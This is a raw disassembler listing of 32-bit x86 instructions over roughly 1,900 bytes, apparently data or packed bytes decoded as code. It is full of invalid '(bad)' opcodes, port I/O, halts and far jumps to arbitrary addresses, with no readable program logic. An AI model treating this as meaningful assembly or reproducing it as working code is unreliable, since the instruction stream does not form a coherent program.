  41fd17:	adc    eax,0x2656541b
  41fd1c:	sbb    BYTE PTR [ebx+0x32f83295],0xf7
  41fd23:	stos   DWORD PTR es:[edi],eax
  41fd24:	push   cs
  41fd25:	cmp    al,0xed
  41fd27:	mov    ebx,DWORD PTR [edx-0x1d]
  41fd2a:	loope  0x41fd23
  41fd2c:	shr    ebx,1
  41fd2e:	add    eax,0xa820f8a2
  41fd33:	add    edx,DWORD PTR [ebp+0x2c]
  41fd36:	and    al,0x16
  41fd38:	repz mov edx,0xd51dac00
  41fd3e:	mov    edx,0x336657d3
  41fd43:	add    eax,0x3461f0b7
  41fd48:	push   0xffffffd1
  41fd4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd4b:	mov    dl,0xed
  41fd4d:	xchg   edi,eax
  41fd4e:	jmp    0xb463:0x1042c9e7
  41fd55:	lock lods eax,DWORD PTR ds:[esi]
  41fd57:	push   0x8cd1b1cb
  41fd5c:	mov    dh,0x90
  41fd5e:	dec    esp
  41fd5f:	mov    bh,0x9b
  41fd61:	cli    
  41fd62:	inc    esp
  41fd63:	adc    BYTE PTR [ecx+0x2af693a5],bl
  41fd69:	and    ch,BYTE PTR [ebp+ebx*4-0x2755adf0]
  41fd70:	pushf  
  41fd71:	hlt    
  41fd72:	mov    ebx,0xcd510434
  41fd77:	outs   dx,BYTE PTR ds:[esi]
  41fd78:	sub    DWORD PTR [edx+0x79],0xffffffe0
  41fd7c:	cwde   
  41fd7d:	scas   eax,DWORD PTR es:[edi]
  41fd7e:	test   al,0xf1
  41fd80:	(bad)  
  41fd81:	sbb    eax,0xf25091ec
  41fd86:	sbb    al,0x6a
  41fd88:	and    BYTE PTR [esi],dh
  41fd8a:	add    eax,0x218f9855
  41fd8f:	je     0x41fd5f
  41fd91:	xchg   ecx,eax
  41fd92:	rcl    esi,1
  41fd94:	iret   
  41fd95:	aam    0xf0
  41fd97:	pop    esi
  41fd98:	add    DWORD PTR [edx+0x7c],eax
  41fd9b:	nop
  41fd9c:	(bad)  
  41fd9d:	or     bl,BYTE PTR [edx+0x3053b41e]
  41fda3:	out    dx,al
  41fda4:	fidivr WORD PTR [ecx-0x56]
  41fda7:	sub    eax,0x880c5056
  41fdac:	cmc    
  41fdad:	fmulp  st(3),st
  41fdb0:	repz jno 0x41fdfb
  41fdb3:	push   ds
  41fdb4:	pop    edi
  41fdb5:	ins    DWORD PTR es:[edi],dx
  41fdb6:	shl    BYTE PTR [esi],1
  41fdb8:	addr16 xor ecx,edx
  41fdbb:	lods   al,BYTE PTR ds:[esi]
  41fdbc:	push   cs
  41fdbd:	rcl    BYTE PTR [ebp-0x7560b27e],0x56
  41fdc4:	int3   
  41fdc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdc6:	aaa    
  41fdc7:	cmp    BYTE PTR [edi-0x20f10458],dl
  41fdcd:	cmp    al,0x92
  41fdcf:	mov    cl,0x7
  41fdd1:	ret    
  41fdd2:	mov    al,0x1f
  41fdd4:	jno    0x41fd9b
  41fdd6:	sbb    dh,ch
  41fdd8:	dec    esp
  41fdd9:	aas    
  41fdda:	xchg   esp,eax
  41fddb:	out    0x5b,al
  41fddd:	sbb    BYTE PTR [edi+0x28528699],cl
  41fde3:	in     al,0xe7
  41fde5:	cld    
  41fde6:	sub    al,0xbd
  41fde8:	pop    edx
  41fde9:	fild   WORD PTR [eax+0x42]
  41fdec:	sub    edx,ebp
  41fdee:	test   eax,0x2fc6cce2
  41fdf3:	dec    BYTE PTR [eax-0x24589916]
  41fdf9:	xor    BYTE PTR [eax+0x5a],ah
  41fdfc:	loopne 0x41fe6f
  41fdfe:	retf   
  41fdff:	mov    eax,0x99452aa4
  41fe04:	lea    ebx,[ebx]
  41fe06:	dec    ecx
  41fe07:	mov    edi,0x6be2675
  41fe0c:	mov    edx,0xc28d5c3c
  41fe11:	mov    ?,WORD PTR [ebx+0x25]
  41fe14:	mov    al,0x59
  41fe16:	fnsave [ebx-0x5f26a96a]
  41fe1c:	lock xchg esi,eax
  41fe1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe1f:	mov    cl,0x84
  41fe21:	enter  0xb0bb,0xf8
  41fe25:	adc    ah,BYTE PTR [edi-0x5ca68928]
  41fe2b:	hlt    
  41fe2c:	xchg   esp,eax
  41fe2d:	dec    esi
  41fe2e:	fs in  al,0x58
  41fe31:	cdq    
  41fe32:	mov    ecx,0x841eb446
  41fe37:	mov    ah,bl
  41fe39:	pop    ds
  41fe3a:	cdq    
  41fe3b:	stc    
  41fe3c:	fidivr DWORD PTR [eax-0x730ef0f4]
  41fe42:	dec    eax
  41fe43:	xor    ch,BYTE PTR [esi]
  41fe45:	xor    eax,0xc6c53411
  41fe4a:	(bad)  
  41fe4b:	xor    bl,ch
  41fe4d:	sub    bh,bl
  41fe4f:	ins    BYTE PTR es:[edi],dx
  41fe50:	push   ds
  41fe51:	dec    eax
  41fe52:	daa    
  41fe53:	dec    edx
  41fe54:	push   ebx
  41fe55:	dec    esp
  41fe56:	rcr    DWORD PTR ds:0x9033e5aa,cl
  41fe5c:	add    eax,0x336ddd4c
  41fe61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe62:	inc    edi
  41fe63:	popf   
  41fe64:	mov    ecx,0x58ddc03c
  41fe69:	bound  edi,QWORD PTR [eax-0x1c]
  41fe6c:	ins    BYTE PTR es:[edi],dx
  41fe6d:	sbb    ebx,DWORD PTR [eax+0x3a052648]
  41fe73:	cmp    edi,DWORD PTR [ecx]
  41fe75:	push   edi
  41fe76:	lea    ebx,[ecx]
  41fe78:	out    dx,al
  41fe79:	fdivr  QWORD PTR [ebx-0x79]
  41fe7c:	icebp  
  41fe7d:	icebp  
  41fe7e:	mov    ebx,0x787a4f36
  41fe83:	aam    0x7c
  41fe85:	inc    ecx
  41fe86:	cmp    BYTE PTR [eax+0x59],0x45
  41fe8a:	add    DWORD PTR [ecx+0x55],ebx
  41fe8d:	fcom   QWORD PTR [ecx-0x5b]
  41fe90:	cmp    BYTE PTR [esp+eiz*8],0xa8
  41fe94:	add    DWORD PTR [ebx+esi*1-0x59df912d],edx
  41fe9b:	retf   0xc880
  41fe9e:	loop   0x41feff
  41fea0:	fs popa 
  41fea2:	xor    cl,dh
  41fea4:	jne    0x41fef1
  41fea6:	addr16 stc 
  41fea8:	cmp    eax,0x4d23e180
  41fead:	test   eax,0x37bc95a6
  41feb2:	mov    esp,0xfb871cdf
  41feb7:	push   0xffffffd7
  41feb9:	xor    DWORD PTR [ebx+edx*4-0x41dccc76],esp
  41fec0:	test   eax,0x4caa6bd5
  41fec5:	iret   
  41fec6:	fadd   st(3),st
  41fec8:	sbb    eax,0x51d15e76
  41fecd:	and    BYTE PTR [eax],cl
  41fecf:	mov    ebp,0x5e9cb035
  41fed4:	add    ebx,DWORD PTR [ecx-0x2885833b]
  41feda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fedb:	inc    edx
  41fedc:	mov    ecx,0xff86a359
  41fee1:	fcos   
  41fee3:	dec    edi
  41fee4:	xchg   esi,eax
  41fee5:	push   es
  41fee6:	aas    
  41fee7:	sub    DWORD PTR [edi-0x7013cc56],ecx
  41feed:	(bad)  
  41feef:	push   esp
  41fef0:	int3   
  41fef1:	jnp    0x41fed4
  41fef3:	sar    BYTE PTR [edi+0x2e2722c1],0x9e
  41fefa:	sub    al,0xb0
  41fefc:	in     al,dx
  41fefd:	test   DWORD PTR [eax-0x20],eax
  41ff00:	dec    ebx
  41ff01:	lock sbb BYTE PTR [eax],dh
  41ff04:	in     al,0x1a
  41ff06:	shr    BYTE PTR [bx+si-0x70f3],cl
  41ff0b:	fucomp st(4)
  41ff0d:	in     eax,0x49
  41ff0f:	push   ebx
  41ff10:	inc    eax
  41ff11:	xchg   DWORD PTR [ebx],ecx
  41ff13:	pushf  
  41ff14:	jno    0x41fee9
  41ff16:	pop    es
  41ff17:	add    al,0xbe
  41ff19:	push   ss
  41ff1a:	(bad)  
  41ff1b:	fwait
  41ff1c:	add    al,0x47
  41ff1e:	and    al,0x98
  41ff20:	pushf  
  41ff21:	adc    eax,0xddd35932
  41ff26:	mov    ecx,DWORD PTR [edx+0x3b]
  41ff29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff2a:	dec    esp
  41ff2b:	int    0x1e
  41ff2d:	call   0xa4b86d82
  41ff32:	adc    esp,ecx
  41ff34:	pop    ebp
  41ff35:	pop    ss
  41ff36:	scas   eax,DWORD PTR es:[edi]
  41ff37:	retf   0xc2ef
  41ff3a:	cmc    
  41ff3b:	int3   
  41ff3c:	jl     0x41ff96
  41ff3e:	out    dx,eax
  41ff3f:	(bad)  [edx-0x3ded57e8]
  41ff45:	push   eax
  41ff46:	mov    ah,0x1d
  41ff48:	jae    0x41ff0a
  41ff4a:	test   ch,bl
  41ff4c:	out    dx,al
  41ff4d:	xchg   edx,eax
  41ff4e:	push   eax
  41ff4f:	(bad)  
  41ff50:	out    dx,eax
  41ff51:	jg     0x41ff88
  41ff53:	and    eax,0x1dc08c04
  41ff58:	dec    edi
  41ff59:	in     eax,0xe3
  41ff5b:	push   bp
  41ff5d:	(bad)  
  41ff5e:	data16 int3 
  41ff60:	shl    BYTE PTR [ebx-0x58],1
  41ff63:	gs aas 
  41ff65:	adc    cl,dh
  41ff67:	aam    0x66
  41ff69:	daa    
  41ff6a:	adc    eax,DWORD PTR [edi+0x7e11f8ae]
  41ff70:	push   ds
  41ff71:	and    DWORD PTR [ebp-0x32],esp
  41ff74:	add    ah,al
  41ff76:	jb     0x41ffb3
  41ff78:	pop    ss
  41ff79:	sbb    BYTE PTR [esi+0x27],dl
  41ff7c:	sub    DWORD PTR [edx-0x3c],esp
  41ff7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff80:	pop    es
  41ff81:	xor    DWORD PTR [edi],edi
  41ff83:	mov    cl,BYTE PTR [edi+ebx*4-0x3f13216b]
  41ff8a:	out    dx,al
  41ff8b:	ret    
  41ff8c:	cs dec edx
  41ff8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff90:	mov    dl,0xe2
  41ff92:	stc    
  41ff93:	or     edx,DWORD PTR [ebp+0x38afc600]
  41ff99:	jge    0x41ff7b
  41ff9b:	sub    bl,BYTE PTR [ecx]
  41ff9d:	push   edx
  41ff9e:	pusha  
  41ff9f:	push   ebp
  41ffa0:	aaa    
  41ffa1:	mov    ebx,0xe4b8def7
  41ffa6:	pshufw mm2,mm1,0x3d
  41ffaa:	dec    ebx
  41ffab:	sbb    al,0x5a
  41ffad:	add    esp,DWORD PTR [edx+edx*2-0x2f]
  41ffb1:	pop    ecx
  41ffb2:	jo     0x41ff35
  41ffb4:	and    al,0xf4
  41ffb6:	scas   eax,DWORD PTR es:[edi]
  41ffb7:	cmp    BYTE PTR [ebx+0x2dcb409e],cl
  41ffbd:	jno    0x41ff67
  41ffbf:	dec    ebp
  41ffc0:	xchg   ebx,eax
  41ffc1:	lods   al,BYTE PTR ds:[esi]
  41ffc2:	lods   al,BYTE PTR ds:[esi]
  41ffc3:	adc    dh,dl
  41ffc5:	sbb    eax,0x5326d421
  41ffca:	pop    ecx
  41ffcb:	aas    
  41ffcc:	inc    esi
  41ffcd:	xchg   esp,eax
  41ffce:	sub    al,0xfa
  41ffd0:	xchg   ebx,eax
  41ffd1:	sub    DWORD PTR [edi],edx
  41ffd3:	add    DWORD PTR [edx+0x14],esp
  41ffd6:	aad    0x52
  41ffd8:	ja     0x420054
  41ffda:	mov    bl,0x15
  41ffdc:	sbb    eax,0x3d2c3353
  41ffe1:	xor    al,BYTE PTR [edx+0x59]
  41ffe4:	add    BYTE PTR [eax-0x5b],cl
  41ffe7:	cmp    ecx,ebx
  41ffe9:	mov    al,0x32
  41ffeb:	lods   eax,DWORD PTR ds:[esi]
  41ffec:	imul   esi,DWORD PTR [eax-0x39],0x23
  41fff0:	scas   al,BYTE PTR es:[edi]
  41fff1:	dec    esi
  41fff2:	repz add DWORD PTR [edi+ebx*1],eax
  41fff6:	mov    edx,0xba497a19
  41fffb:	inc    ebp
  41fffc:	fld    DWORD PTR [ebx+0x68]
  41ffff:	(bad)  [ebp-0x60]
  420002:	mov    WORD PTR [ebp+0x7f],fs
  420005:	cld    
  420006:	dec    edi
  420007:	pop    eax
  420008:	rcr    ch,1
  42000a:	jae    0x42005b
  42000c:	dec    ebp
  42000d:	aad    0xd1
  42000f:	enter  0x455b,0x11
  420013:	jns    0x420014
  420015:	outs   dx,BYTE PTR ds:[esi]
  420016:	aaa    
  420017:	pop    ebp
  420018:	dec    eax
  420019:	mov    ecx,0x423b081b
  42001e:	pop    esi
  42001f:	shl    DWORD PTR [eax-0x2f],0x5c
  420023:	jbe    0x420028
  420025:	out    dx,al
  420026:	add    ecx,esp
  420028:	fcmove st,st(7)
  42002a:	mov    DWORD PTR ds:0xd26f508d,0x59b1ac9a
  420034:	cmp    dh,BYTE PTR [ebp+0x47]
  420037:	pop    ecx
  420038:	fild   WORD PTR ds:0xe49c86f
  42003e:	inc    ebp
  42003f:	aaa    
  420040:	push   0x1c47606f
  420045:	repz call 0x25bd754f
  42004b:	pop    edi
  42004c:	and    al,0x57
  42004e:	sar    DWORD PTR [edi+0x682eb11b],cl
  420054:	or     dl,BYTE PTR [ecx]
  420056:	mov    ebp,0x79965361
  42005b:	rcl    esi,cl
  42005d:	push   edi
  42005e:	rcl    edi,1
  420060:	jb     0x42005d
  420062:	mov    cl,0x95
  420064:	(bad)  
  420065:	mov    ch,0x9e
  420067:	fs xchg esp,eax
  420069:	clc    
  42006a:	leave  
  42006b:	xchg   BYTE PTR [edi+0x3e],cl
  42006e:	ds adc eax,0x5da6b1f4
  420074:	adc    eax,0x413539c6
  420079:	add    al,0x16
  42007b:	jecxz  0x420061
  42007d:	mov    bl,0x32
  42007f:	or     esp,DWORD PTR [eax]
  420081:	and    cl,dl
  420083:	aas    
  420084:	les    eax,FWORD PTR [edi-0xaca5c93]
  42008a:	mov    WORD PTR [edx],fs
  42008c:	nop
  42008d:	inc    eax
  42008e:	imul   edx,esi,0x1b
  420091:	jmp    0x25eab231
  420096:	mov    ds:0x1e54c48a,eax
  42009b:	adc    ch,bh
  42009d:	mov    ebx,0xe255e306
  4200a2:	ret    
  4200a3:	dec    ecx
  4200a4:	rcl    BYTE PTR [edi+0x14],1
  4200a7:	add    al,0x17
  4200a9:	inc    bp
  4200ab:	aas    
  4200ac:	or     eax,0x39fbd69
  4200b1:	(bad)  
  4200b2:	(bad)  
  4200b3:	cs js  0x42005a
  4200b6:	call   0x76b4e4cf
  4200bb:	in     al,0x37
  4200bd:	cmp    BYTE PTR [edx+eax*4-0xbf12bae],0x4
  4200c5:	push   ebp
  4200c6:	jnp    0x4200df
  4200c8:	xor    eax,0x9c76bdb1
  4200cd:	push   0x34cc496f
  4200d2:	neg    BYTE PTR [esi-0x1a]
  4200d5:	in     al,dx
  4200d6:	push   cs
  4200d7:	icebp  
  4200d8:	pop    ss
  4200d9:	inc    edi
  4200da:	retf   0x4eb1
  4200dd:	pop    eax
  4200de:	jmp    ebp
  4200e0:	test   eax,0x44e23241
  4200e5:	inc    edx
  4200e6:	dec    edi
  4200e7:	out    0x5e,eax
  4200e9:	leave  
  4200ea:	mov    bl,BYTE PTR [ecx+ebx*8-0x5e]
  4200ee:	fst    DWORD PTR [eax-0x3a]
  4200f1:	jo     0x420104
  4200f3:	into   
  4200f4:	inc    ebp
  4200f5:	aaa    
  4200f6:	fwait
  4200f7:	pushf  
  4200f8:	pop    edx
  4200f9:	aam    0x75
  4200fb:	sub    BYTE PTR [edi-0x728d161d],ah
  420101:	jae    0x4200da
  420103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420104:	int3   
  420105:	cs jle 0x42009c
  420108:	in     al,0xd3
  42010a:	jo     0x4200ce
  42010c:	or     eax,0xa8c1f1c9
  420111:	add    cl,bh
  420113:	mov    ds:0x5816a75d,al
  420118:	nop
  420119:	cmp    DWORD PTR [esi+0x16],esi
  42011c:	inc    edi
  42011d:	mov    edx,0x60bae928
  420122:	sahf   
  420123:	lods   eax,DWORD PTR ds:[esi]
  420124:	lods   eax,DWORD PTR ds:[esi]
  420125:	jns    0x420189
  420127:	pop    edi
  420128:	inc    esi
  420129:	jmp    0x57fa:0x45bdc105
  420130:	sbb    al,0x59
  420132:	outs   dx,BYTE PTR ds:[esi]
  420133:	call   0xf562:0xa8039762
  42013a:	pop    ss
  42013b:	lds    eax,FWORD PTR [edi]
  42013d:	jnp    0x420114
  42013f:	fs cs mov esp,0x9288561f
  420146:	data16 into 
  420148:	daa    
  420149:	xor    al,0x69
  42014b:	pushf  
  42014c:	lds    ebx,FWORD PTR [esi]
  42014e:	(bad)  
  42014f:	sub    al,0xd
  420151:	lods   eax,DWORD PTR ds:[esi]
  420152:	ficom  WORD PTR [ebx-0x2d]
  420155:	out    dx,eax
  420156:	stos   BYTE PTR es:[edi],al
  420157:	in     al,0x5d
  420159:	inc    ebp
  42015a:	xor    eax,0x60782b39
  42015f:	xchg   DWORD PTR [edx+0x57],esp
  420162:	aam    0x47
  420164:	ret    0x6711
  420167:	xor    dl,dh
  420169:	enterw 0x763f,0x68
  42016e:	sbb    DWORD PTR [ebx+0x46],0x58ce2d7e
  420175:	adc    eax,eax
  420177:	fdiv   DWORD PTR [ebx-0x5dbde832]
  42017d:	sub    ch,BYTE PTR [edx-0x20045ff1]
  420183:	pop    ds
  420184:	test   al,0xb2
  420186:	sbb    eax,0xb796afc6
  42018b:	lahf   
  42018c:	arpl   si,di
  42018e:	enter  0x5d13,0x6e
  420192:	(bad)  
  420193:	xchg   DWORD PTR [edx-0x7c],eax
  420196:	mov    ecx,0x35310b97
  42019b:	push   esp
  42019c:	rcl    DWORD PTR [eax],0x1a
  42019f:	pop    edx
  4201a0:	sbb    DWORD PTR [esi],ecx
  4201a2:	out    0x8b,eax
  4201a4:	cmp    eax,0x859b63e2
  4201a9:	clc    
  4201aa:	mov    edi,ecx
  4201ac:	sbb    eax,DWORD PTR [eax+edi*8+0x5b]
  4201b0:	and    eax,0xa86ad94a
  4201b5:	sub    BYTE PTR [ebx+0x1ab6d2c7],0xea
  4201bc:	bound  edi,QWORD PTR [eax]
  4201be:	ret    
  4201bf:	imul   esi,DWORD PTR [ebp-0x1a],0x6daa0ac4
  4201c6:	sbb    BYTE PTR [esi-0x48],ah
  4201c9:	cmp    cl,ch
  4201cb:	addr16 xor bh,ch
  4201ce:	dec    ebp
  4201cf:	xchg   esp,eax
  4201d0:	mov    ah,0x25
  4201d2:	ins    DWORD PTR es:[edi],dx
  4201d3:	xor    DWORD PTR [ebp-0x14c46571],ebp
  4201d9:	pushf  
  4201da:	and    al,BYTE PTR [ebx+ecx*8+0x5]
  4201de:	bound  ebx,QWORD PTR [eax-0x6da2b191]
  4201e4:	call   0xdd165bbb
  4201e9:	(bad)  
  4201ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201eb:	xchg   edx,eax
  4201ec:	xor    DWORD PTR [edx+0x5e],ebx
  4201ef:	add    bl,ah
  4201f1:	dec    ecx
  4201f2:	pop    edx
  4201f3:	add    BYTE PTR [ebx],0x74
  4201f6:	fwait
  4201f7:	adc    BYTE PTR [ebp-0x26],dl
  4201fa:	mov    al,ds:0x20633667
  4201ff:	mov    ebx,0xace40057
  420204:	arpl   WORD PTR [edi+0x653dfd53],dx
  42020a:	test   DWORD PTR [eax],eax
  42020c:	mov    edi,0x67176ac9
  420211:	xchg   esp,eax
  420212:	xchg   DWORD PTR [ebp+ebp*8+0x42],edx
  420216:	imul   cx,WORD PTR [ebx+0x7],0xa2ce
  42021c:	cmp    eax,0xfbd1d9fb
  420221:	loope  0x420291
  420223:	lock repz xor ecx,DWORD PTR [ecx+0x51e4fa32]
  42022b:	pop    ebp
  42022c:	outs   dx,DWORD PTR ds:[esi]
  42022d:	out    dx,al
  42022e:	inc    ebx
  42022f:	rcl    BYTE PTR ds:0xf35c7f56,cl
  420235:	rcl    BYTE PTR [esi+0x43],1
  420238:	test   eax,0xf5f87cf3
  42023d:	mov    ds:0x629f8981,al
  420242:	test   al,0xd8
  420244:	mov    al,0x21
  420246:	adc    DWORD PTR [edi-0x35],ebp
  420249:	xor    BYTE PTR [ebp-0x93ca48f],dl
  42024f:	add    DWORD PTR [ebx-0x1248740],ebp
  420255:	jnp    0x4202c4
  420257:	icebp  
  420258:	jae    0x4202d7
  42025a:	mov    esi,0xca1b9607
  42025f:	dec    edx
  420260:	(bad)  
  420261:	into   
  420262:	inc    edi
  420263:	jg     0x420261
  420265:	(bad)  
  420266:	fidiv  DWORD PTR [eax]
  420268:	sbb    edx,DWORD PTR [ebx+0x50]
  42026b:	xor    edi,DWORD PTR [edi]
  42026d:	cdq    
  42026e:	mov    esi,0x5bb0ce10
  420273:	cli    
  420274:	nop
  420275:	push   eax
  420276:	(bad)  
  420277:	inc    esi
  420278:	adc    esp,eax
  42027a:	fs mov edi,0xdc2a983a
  420280:	mov    BYTE PTR [ebx+0x2d],ah
  420283:	cmp    BYTE PTR [ecx],dh
  420285:	xor    DWORD PTR [edi],edi
  420287:	and    BYTE PTR es:[edi],cl
  42028a:	jns    0x420309
  42028c:	loop   0x4202f6
  42028e:	sbb    eax,0x87f840f
  420293:	or     al,0x94
  420295:	xor    al,BYTE PTR [edi+eiz*4]
  420298:	xchg   ecx,eax
  420299:	fiadd  WORD PTR [esi-0x4d]
  42029c:	mov    bh,0xfc
  42029e:	shl    ecx,cl
  4202a0:	xchg   ebx,eax
  4202a1:	jl     0x4202e7
  4202a3:	cmp    ecx,DWORD PTR [edi-0x154c16c1]
  4202a9:	mov    dl,0x5
  4202ab:	xor    bh,bl
  4202ad:	mov    ah,0x79
  4202af:	adc    dh,0x5e
  4202b2:	addr16 repz inc edi
  4202b5:	(bad)  
  4202b6:	sbb    al,0x59
  4202b8:	loopne 0x4202bd
  4202ba:	jmp    0x4575:0xfc1aad24
  4202c1:	dec    ebp
  4202c2:	retf   
  4202c3:	out    dx,al
  4202c4:	add    al,BYTE PTR [ecx]
  4202c6:	push   ss
  4202c7:	ret    0x88cd
  4202ca:	pop    ds
  4202cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202cc:	pushf  
  4202cd:	mov    eax,0x5b5357d8
  4202d2:	jae    0x4202f3
  4202d4:	and    DWORD PTR [esi],ebp
  4202d6:	mov    ch,BYTE PTR [ebx]
  4202d8:	sbb    ecx,DWORD PTR [esi-0x30]
  4202db:	and    edi,DWORD PTR [ecx]
  4202dd:	cmp    bh,bl
  4202df:	dec    esp
  4202e0:	(bad)  
  4202e1:	push   ss
  4202e2:	mov    edi,0xbaf71149
  4202e7:	sub    bl,dh
  4202e9:	pop    edx
  4202ea:	lods   eax,DWORD PTR ds:[esi]
  4202eb:	xor    BYTE PTR [eax+esi*2+0x36717492],bl
  4202f2:	push   esp
  4202f3:	jg     0x420357
  4202f5:	mov    edi,DWORD PTR [ebx+0x79]
  4202f8:	scas   al,BYTE PTR es:[edi]
  4202f9:	xlat   BYTE PTR ds:[ebx]
  4202fa:	sbb    cl,dl
  4202fc:	pop    ebp
  4202fd:	or     BYTE PTR [eax],0x17
  420300:	xchg   BYTE PTR [ebx+0x41],ah
  420303:	into   
  420304:	inc    ebp
  420305:	fcom   QWORD PTR [eax+0x2f78e303]
  42030b:	add    eax,0x86c96f1c
  420310:	not    bh
  420312:	pop    edx
  420313:	lea    esi,[ecx+0x1f2a20c5]
  420319:	inc    ebp
  42031a:	mov    cl,0xe0
  42031c:	mov    edi,eax
  42031e:	sbb    DWORD PTR [esi],esp
  420320:	(bad)  
  420321:	test   BYTE PTR [edx],bh
  420323:	and    ebx,DWORD PTR [ebp-0x30]
  420326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420327:	fmul   QWORD PTR [esp+esi*4-0x7]
  42032b:	mov    WORD PTR [ecx+0x5a],ss
  42032e:	pop    esi
  42032f:	mov    ebx,0x6c605417
  420334:	aam    0xf7
  420336:	sar    BYTE PTR [edx],cl
  420338:	jne    0x4203b7
  42033a:	xchg   DWORD PTR [ebx],ecx
  42033c:	and    ch,BYTE PTR [esi+0x6d]
  42033f:	add    al,0xdd
  420341:	nop
  420342:	fwait
  420343:	push   ss
  420344:	and    eax,0xf33436e5
  420349:	shr    DWORD PTR [ebx],1
  42034b:	jb     0x4202d2
  42034d:	sub    ecx,ecx
  42034f:	into   
  420350:	add    DWORD PTR [esi-0x3],ebp
  420353:	or     ebx,eax
  420355:	adc    BYTE PTR es:[edi+0x46],bh
  420359:	push   0x5f
  42035b:	(bad)  
  42035c:	sti    
  42035d:	or     eax,0x6e8dabb0
  420362:	hlt    
  420363:	jnp    0x420346
  420365:	mov    ds:0xe2826748,al
  42036a:	jns    0x420325
  42036c:	pop    eax
  42036d:	or     ebx,DWORD PTR [esp+eax*2-0x6e]
  420371:	(bad)  
  420372:	lahf   
  420373:	add    DWORD PTR ds:0x99804eec,esp
  420379:	ins    BYTE PTR es:[edi],dx
  42037a:	lods   al,BYTE PTR ds:[esi]
  42037b:	dec    ebp
  42037c:	mov    ch,0x51
  42037e:	sahf   
  42037f:	push   cs
  420380:	ret    
  420381:	shl    bh,cl
  420383:	arpl   WORD PTR [ecx+0x28],sp
  420386:	(bad)  
  420387:	fsubrp st(4),st
  420389:	in     eax,0xc8
  42038b:	xchg   ebx,eax
  42038c:	xchg   DWORD PTR [esi+0x1f53ada8],edi
  420392:	fld    st(1)
  420394:	xor    edx,edi
  420396:	ins    BYTE PTR es:[edi],dx
  420397:	mov    ecx,0x1ace45f5
  42039c:	stos   BYTE PTR es:[edi],al
  42039d:	mov    dl,0xa4
  42039f:	dec    DWORD PTR [ebx+0x42]
  4203a2:	xchg   ecx,eax
  4203a3:	call   FWORD PTR [ecx]
  4203a5:	rcr    DWORD PTR [ecx],cl
  4203a7:	push   es
  4203a8:	sub    edx,DWORD PTR [ebp+edx*1-0x50]
  4203ac:	push   cs
  4203ad:	pop    ebp
  4203ae:	stos   DWORD PTR es:[edi],eax
  4203af:	shr    BYTE PTR [edx+ebx*1-0x145e9b8f],1
  4203b6:	push   ebp
  4203b7:	push   ss
  4203b8:	push   0xffffffe9
  4203ba:	gs loop 0x420403
  4203bd:	out    0xb7,al
  4203bf:	lea    ecx,ss:[eax]
  4203c2:	test   BYTE PTR [eax-0x1f],al
  4203c5:	sub    BYTE PTR [ebx],0x24
  4203c8:	push   0x81554703
  4203cd:	adc    al,0x9b
  4203cf:	dec    esi
  4203d0:	jp     0x4203e8
  4203d2:	stos   DWORD PTR es:[edi],eax
  4203d3:	sbb    DWORD PTR [ecx-0x4a],eax
  4203d6:	retf   
  4203d7:	add    al,0x99
  4203d9:	js     0x420373
  4203db:	push   0xffffff88
  4203dd:	rol    DWORD PTR [esi-0x7],cl
  4203e0:	mov    edi,esi
  4203e2:	stos   BYTE PTR es:[edi],al
  4203e3:	pop    esp
  4203e4:	popa   
  4203e5:	mov    al,ds:0x499591ef
  4203ea:	and    eax,edi
  4203ec:	hlt    
  4203ed:	pop    esi
  4203ee:	fist   DWORD PTR [ebp+ecx*8-0x1c1817e6]
  4203f5:	aas    
  4203f6:	sub    bl,dh
  4203f8:	mov    gs,WORD PTR ds:0xa1f23f8a
  4203fe:	fidiv  DWORD PTR [esi-0x4bdbf859]
  420404:	jle    0x4203cc
  420406:	jnp    0x420444
  420408:	add    BYTE PTR [ebp-0x15bc4935],al
  42040e:	dec    edi
  42040f:	js     0x420458
  420411:	jns    0x4203ab
  420413:	mov    dl,0x2b
  420415:	dec    ebx
  420416:	sub    DWORD PTR ds:0x1a14c9ec,ecx
  42041c:	hlt    
  42041d:	retf   
  42041e:	or     al,0xe7
  420420:	jecxz  0x4203c9
  420422:	test   BYTE PTR [eiz*1+0x13d25a37],cl
  420429:	xchg   esi,eax
  42042a:	mov    bh,0xfa
  42042c:	out    0x3,eax
  42042e:	add    DWORD PTR [ebx],ecx
  420430:	ficom  WORD PTR [esi+0x2d78f1fa]
  420436:	mov    ds:0x30e053f3,al
  42043b:	sub    eax,0x69b74a0e
  420440:	test   al,0x4e
  420442:	popa   
  420443:	cmp    eax,0x2cd871fc
  420448:	fs mov bl,0x44
  42044b:	hlt    
  42044c:	aad    0x5c
  42044e:	cmp    al,0xc2
  420450:	mov    ecx,0x4d7cb9af
  420455:	leave  
  420456:	in     eax,dx
  420457:	pop    ds
  420458:	out    0x44,al
  42045a:	inc    ebp
  42045b:	cwde   
  42045c:	or     eax,0x21ed5776
  420461:	mov    BYTE PTR [esp+ebx*2+0x62],dl
  420465:	xor    al,0x78
  420467:	mov    ch,0x8a
  420469:	ret    0xeb15
  42046c:	push   es
  42046d:	mov    edx,0x779efcf8
  420472:	lock popa 
  420474:	mov    dl,0x44
  420476:	fimul  DWORD PTR [eax+eax*2]
  420479:	pop    ss
  42047a:	sub    eax,DWORD PTR [ebp-0x35]
  42047d:	and    bh,bl
  42047f:	pop    ds
  420480:	cld    
  420481:	sub    DWORD PTR [ebp+ecx*1-0x43bda35e],ebp
  420488:	mov    edi,0x4b56f192
  42048d:	pop    ds
  42048e:	add    BYTE PTR [ebx-0x3c35f120],bh
  420494:	and    al,0xc2
  420496:	jge    0x420419
  420498:	scas   eax,DWORD PTR es:[edi]
  420499:	in     eax,0x7b
  42049b:	jl     0x42042a
  42049d:	(bad)  
  42049e:	hlt    
  42049f:	shl    BYTE PTR [ebx+0x6099016e],1
  4204a5:	fmul   QWORD PTR [eax-0x58bd8bca]
